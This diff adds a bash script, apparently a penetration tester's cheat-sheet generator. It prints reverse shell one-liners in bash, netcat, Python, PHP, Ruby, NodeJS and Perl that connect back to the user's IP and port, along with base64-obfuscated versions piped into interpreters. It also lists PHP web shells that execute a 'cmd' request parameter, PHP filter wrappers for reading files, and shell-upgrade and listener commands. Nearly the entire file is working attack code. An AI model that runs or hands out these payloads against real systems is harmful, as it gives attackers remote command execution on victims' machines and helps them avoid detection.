@@ -1,0 +1,92 @@
+
+#!/bin/bash
+
+usage() {
+	echo "  Usage: "
+	echo "	$0 [tun0|eth0] [LPORT]"
+	exit 9001
+}
+
+
+if [ "$#" -ne 2 ]; then
+	usage;
+fi
+
+is_valid_ip() {
+    local ip=$1
+    if [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+MAGENTA="\e[1;35m"
+GREEN="\e[1;32m"
+RED="\e[1;31m"
+CYAN="\e[1;36m"
+END="\e[0m"
+
+
+IF=$1
+LPORT=$2
+
+IP=`ifconfig $IF | grep "inet "| awk '{print $2}'`
+
+
+echo
+echo -e "${MAGENTA}[+] Bash ${END}"
+echo -e "${GREEN}bash -i >& /dev/tcp/$IP/$LPORT 0>&1${END}" 
+echo -e "${GREEN}bash -c 'bash -i >& /dev/tcp/$IP/$LPORT 0>&1'${END}"
+echo -e "${RED}echo `echo "bash -i >& /dev/tcp/$IP/$LPORT 0>&1"|base64 -w 0`|base64 -d|bash${END}"
+
+echo 
+echo -e "${MAGENTA}[+] Fake nc ${END}"
+echo -e "${GREEN}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $LPORT >/tmp/f${END}"
+echo -e "${RED}echo `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $LPORT >/tmp/f"|base64 -w 0`|base64 -d|bash${END}"
+
+echo 
+echo -e "${MAGENTA}[+] Python ${END}"
+echo -e "${GREEN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${END}"
+echo -e "${RED}echo `echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"$IP\\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);"|base64 -w 0`|base64 -d|python"
+
+echo 
+echo -e "${MAGENTA}[+] PHP ${END}"
+echo -e "${GREEN}php -r '\$sock=fsockopen(\"$IP\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${END}"
+echo -e "${RED}echo `echo "\\$sock=fsockopen(\\"$IP\\",$LPORT);exec(\\"/bin/sh -i <&3 >&3 2>&3\\");"|base64 -w 0`|base64 -d|php -a${END}"
+
+echo 
+echo -e "${MAGENTA}[+] Ruby ${END}"
+echo -e "${GREEN}ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"$IP\",$LPORT))'${END}"
+echo -e "${RED}echo `echo 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("'$IP'",'$LPORT'))'|base64 -w 0`|base64 -d|ruby -rsocket${END}"
+
+echo 
+echo -e "${MAGENTA}[+] NodeJS${END}"
+echo -e "${GREEN}node -e '(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect($LPORT, \"$IP\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'${END}"
+echo -e "${RED}a=\`echo $(echo '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect('$LPORT', "'$IP'", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'|base64 -w 0)|base64 -d\`|node -e \$a${END}"
+
+echo 
+echo -e "${MAGENTA}[+] Perl ${END}"
+echo -e "${GREEN}perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($LPORT,inet_aton($IP)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'${END}"
+echo -e "${GREEN}perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$IP:$LPORT\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'${END}"
+echo -e "${RED}echo `echo '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'$IP':'$LPORT'");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' |base64 -w 0`|base64 -d|perl -MIO${END}"
+
+echo 
+echo -e "${MAGENTA}[+] PHP code I always forget${END}"
+echo -e "${CYAN}<?php system(\$_GET['cmd']); ?>${END}"
+echo -e "${CYAN}<?php exec(\$_GET['cmd']); ?>${END}"
+echo -e "${CYAN}<?php shell_exec(\$_GET['cmd']); ?>${END}"
+echo -e "${CYAN}<?php passthru(\$_GET['cmd']); ?>${END}"
+echo -e "${CYAN}<?php popen(\$_GET['cmd']); ?>${END}"
+echo
+echo -e "${MAGENTA}[+] PHP filter${END}"
+echo -e "${CYAN}php://filter/convert.base64-encode/resource=${END}"
+echo -e "${CYAN}php://filter/string.rot13/resource=${END}"
+echo -e "${CYAN}php://filter/convert.base64-decode/resource=${END}"
+echo -e "${CYAN}php://filter/convert.base64-decode/resource=${END}"
+echo
+
+echo -e "${MAGENTA}[+] MISC${END}"
+echo -e "${CYAN}python -c 'import pty;pty.spawn(\"/bin/bash\")${END}"
+echo -e "${CYAN}python3 -c 'import pty;pty.spawn(\"/bin/bash\")${END}"
+echo -e "${CYAN}rlwrap nc -lvnp $LPORT${END}"
